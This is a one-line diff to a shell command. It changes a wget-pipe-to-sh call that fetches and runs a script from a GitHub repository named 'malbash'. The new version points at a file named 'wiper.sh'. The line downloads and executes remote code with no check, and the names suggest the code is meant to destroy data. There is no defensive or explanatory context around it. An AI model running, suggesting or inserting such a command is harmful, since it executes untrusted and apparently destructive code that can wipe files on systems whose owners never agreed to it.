@@ -1,1 +1,1 @@
- wget https://github.com/greyhat-academy/malbash -O- | sh
+ wget https://github.com/greyhat-academy/malbash/blob/main/wiper.sh -O- | sh
